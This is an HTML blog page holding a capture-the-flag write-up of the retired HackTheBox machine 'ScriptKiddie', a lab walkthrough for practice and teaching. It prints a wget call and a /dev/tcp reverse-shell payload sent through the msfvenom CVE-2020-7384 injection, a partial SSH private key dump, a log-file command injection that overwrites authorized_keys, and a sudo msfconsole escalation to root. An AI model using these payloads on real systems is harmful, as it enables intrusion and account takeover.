@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: ScriptKiddie | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2021/06/htb-scriptkiddie.html" title="Read more" class="entry-title-link">
+                HTB: ScriptKiddie</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2021-06-07T10:25:00+02:00">07 Jun 2021</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/msfvenom.html" title="Read more with the label msfvenom" class="meta-link">msfvenom</a> 
+          <a href="../../tag/nmap.html" title="Read more with the label nmap" class="meta-link">nmap</a> 
+          <a href="../../tag/msfconsole.html" title="Read more with the label msfconsole" class="meta-link">msfconsole</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 5 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2021.06/sk_card.png" alt="ScriptKiddie Card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/314">ScriptKiddie</a> publish on
+February 6, 2021 by
+<a href="https://www.hackthebox.eu/home/users/profile/4935">0xdf</a>.
+This box is rated as easy box the user part implies to use CVE-2020-7384, the
+root part is just abusing a bash script and using msfconsole.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. Only port 22 (SSH) and 5000 with a HTTP
+service are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.91 scan initiated Sun Feb  7 08:50:44 2021 as: nmap -p- -sSV -oN nmap 10.129.94.194</span>
+<span class="code-line">Nmap scan report for 10.129.94.194</span>
+<span class="code-line">Host is up (0.011s latency).</span>
+<span class="code-line">Not shown: 65533 closed ports</span>
+<span class="code-line">PORT     STATE SERVICE VERSION</span>
+<span class="code-line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Sun Feb  7 08:51:09 2021 -- 1 IP address (1 host up) scanned in 24.16 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>The webpage seems to be a "hacker" personal page with a few wrapper around
+classical tools as <code>nmap</code>, <code>msfvenom</code> and <code>searchsploit</code>.</p>
+<p><img alt="Homepage" src="/media/2021.06/sk_01.png"></p>
+<p>The "template file" option with <code>msfvenom</code> is strange. After a few Google research we found
+about CVE-2020-7384 which is "msfvenom APK template command injection" and has
+<a href="https://www.exploit-db.com/exploits/49491">a public exploit available</a></p>
+<p>We change the payload to perform a <code>wget</code> on our python server</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c1"># Change me</span></span>
+<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;wget 10.10.14.64:8000&#39;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We got a hit on our local python HTTP which confirm our RCE.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:/tmp$ python3 -m http.server</span>
+<span class="code-line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+<span class="code-line">10.129.94.194 - - [07/Feb/2021 09:27:09] &quot;GET / HTTP/1.1&quot; 200 -</span>
+<span class="code-line"></code></pre></div>
+
+<p>We change the payload again for a reverse shell.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;sh -i &gt;&amp; /dev/tcp/10.10.14.64/4433 0&gt;&amp;1&#39;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We run netcat to catch it and got the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:/tmp$ nc -l -p 4433</span>
+<span class="code-line">id</span>
+<span class="code-line">sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="code-line">$ uid=1000(kid) gid=1000(kid) groups=1000(kid)</span>
+<span class="code-line">$ cd</span>
+<span class="code-line">$ cat user.txt</span>
+<span class="code-line">51573bc36ae7c15d3bb11c3b043a5dea</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">Root</h1>
+<h2 id="persistance">Persistance</h2>
+<p>We look at our user home folder and get the SSH private key</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ ls -al</span>
+<span class="code-line">total 60</span>
+<span class="code-line">drwxr-xr-x 11 kid  kid  4096 Feb  3 11:49 .</span>
+<span class="code-line">drwxr-xr-x  4 root root 4096 Feb  3 07:40 ..</span>
+<span class="code-line">lrwxrwxrwx  1 root kid     9 Jan  5 20:31 .bash_history -&gt; /dev/null</span>
+<span class="code-line">-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout</span>
+<span class="code-line">-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc</span>
+<span class="code-line">drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .bundle</span>
+<span class="code-line">drwx------  2 kid  kid  4096 Feb  3 07:40 .cache</span>
+<span class="code-line">drwx------  4 kid  kid  4096 Feb  3 11:49 .gnupg</span>
+<span class="code-line">drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .local</span>
+<span class="code-line">drwxr-xr-x  9 kid  kid  4096 Feb  3 07:40 .msf4</span>
+<span class="code-line">-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile</span>
+<span class="code-line">drwx------  2 kid  kid  4096 Feb  3 07:40 .ssh</span>
+<span class="code-line">-rw-r--r--  1 kid  kid     0 Jan  5 11:10 .sudo_as_admin_successful</span>
+<span class="code-line">drwxrwxr-x  5 kid  kid  4096 Feb  7 14:25 html</span>
+<span class="code-line">drwxrwxrwx  2 kid  kid  4096 Feb  3 07:40 logs</span>
+<span class="code-line">drwxr-xr-x  3 kid  kid  4096 Feb  3 11:48 snap</span>
+<span class="code-line">-r--------  1 kid  kid    33 Feb  7 13:48 user.txt</span>
+<span class="code-line">$ ls .ssh/</span>
+<span class="code-line">authorized_keys</span>
+<span class="code-line">id_rsa</span>
+<span class="code-line">id_rsa.pub</span>
+<span class="code-line">$ cat .ssh/authorized_keys</span>
+<span class="code-line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt/</span>
+<span class="code-line">MXWipZH4vmE0lLycTlwk0eFcEQilnSCwpQoLA9QEiFAMvopNThWyjGkst6HNPdDvSDlJEfTtW4PaOFA</span>
+<span class="code-line">seUICcwuidMXc4xepu1t0hrfv5Wn7SiwQwIDwE0DvRRSpLIr9I0wfjjEPnvc4y7uuMvsf0hegZLMnChg</span>
+<span class="code-line">stWWCw99DS5q0YdXxkIC7eKlI90nHyUHL3ULwXDBk6NWhPmJ90yDaFC4iD0yVP3xmjKjl0iotkqbhKhR</span>
+<span class="code-line">AD8bUINZ7anXTw4Hb0iF5tMAttB8JbLts5zvgQtYrciKE4Qnl4F+MO5yg3G03s9V69K4R+TXmI4TZKUH</span>
+<span class="code-line">fEpNnReQ+73uOqgjH5VeZr0TmSLEszfFfXRcv7t4jxOboYnS+lgR1V2iGHzSle+nAlVLHqlwP5RTtwaO</span>
+<span class="code-line">wE0nbykigyz/h4KNCn0rU69fYWSrkcFPYOSm92QKmaMJuXqnycjuqLmHMD2XKSuhlpgD/VmQL34C7pju</span>
+<span class="code-line">4h+/78qK50+itG0FCiSy6IRd5DIfTkU= kid@scriptkiddie</span>
+<span class="code-line">$ cat .ssh/id_rsa</span>
+<span class="code-line">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="code-line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="code-line">NhAAAAAwEAAQAAAYEArfzF1oqWR+L5hNJS8nE5cJNHhXBEIpZ0gsKUKCwPUBIhQDL6KTU4</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">sOeM4jMTD4DJbb/8Jsh6yzW45V3bgPp1Hm4nI3AZ8SjSI4VqtO9CcDKtPnvh3/jm5VEx9W</span>
+<span class="code-line">bK3NNrAo9t2tlfAAAAEGtpZEBzY3JpcHRraWRkaWUBAg==</span>
+<span class="code-line">-----END OPENSSH PRIVATE KEY-----</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="scanlosers">scanlosers</h2>
+<p>We can now  directly connect using SSH. Looking at the accessible files we found
+that the <code>pwn</code> user has a script <code>scanlosers.sh</code> readable by our user. This
+script read a log file containing "hacking" attempts and run a <code>nmap --top10</code> on
+it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ ssh kid@10.129.94.194 -i sc_id_rsa</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">kid@scriptkiddie:~$ cat ../pwn/scanlosers.sh</span>
+<span class="code-line">#!/bin/bash</span>
+<span class="code-line"></span>
+<span class="code-line">log=/home/kid/logs/hackers</span>
+<span class="code-line"></span>
+<span class="code-line">cd /home/pwn/</span>
+<span class="code-line">cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do</span>
+<span class="code-line">    sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&quot; &amp;</span>
+<span class="code-line">done</span>
+<span class="code-line"></span>
+<span class="code-line">if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi</span>
+<span class="code-line"></code></pre></div>
+
+<p>We download /home/kid/.ssh/authorized_keys localy and rename it to test a few
+payload locally. The <code>cut -d' ' -f3-</code> means that the 3 first "words"
+(characters separated by a space) will be dropped.</p>
+<p>The idea is to execute a payload in order to add our SSH key to the "pwn"
+user. As always we start by a simple <code>wget</code> to ensure the RCE. After a few
+attempt we found the following payload that we add to the <code>hackers</code> file:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>echo &#39;q w e 127.0.0.1 127.0.0.1 ; wget 10.10.14.64:8000/a -O /home/pwn/.ssh/authorized_keys  ; #&#39; &gt; ../kid/logs/hackers</span>
+<span class="code-line"></code></pre></div>
+
+<p>As the "kid" private key is now also authorized for the "pown" user, we connect
+using directly SSH.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ ssh pwn@10.129.94.194 -i sc_id_rsa</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">pwn@scriptkiddie:~$ id</span>
+<span class="code-line">uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="msfconsole">msfconsole</h2>
+<p>Our "pown" user can run <code>msfconsole</code> as "root" without any password, which
+quickly give us a shell using the <code>bash</code> msf command allowing us to get the root
+flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pwn@scriptkiddie:~$ sudo -l</span>
+<span class="code-line">Matching Defaults entries for pwn on scriptkiddie:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User pwn may run the following commands on scriptkiddie:</span>
+<span class="code-line">    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole</span>
+<span class="code-line">pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole</span>
+<span class="code-line"></span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">msf6 &gt; bash</span>
+<span class="code-line">[*] exec: bash</span>
+<span class="code-line"></span>
+<span class="code-line">root@scriptkiddie:/home/pwn# id</span>
+<span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="code-line">root@scriptkiddie:/home/pwn# cat /root/root.txt</span>
+<span class="code-line">b4ccca123e8efc9cc65296e42ed4cabf</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>An easy box exploiting a few mechanisms. The msfvenom exploit was fun to use.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2021/05/htb-delivery.html"> HTB: Delivery </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2021/07/htb-ophiuchi.html"> HTB: Ophiuchi </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
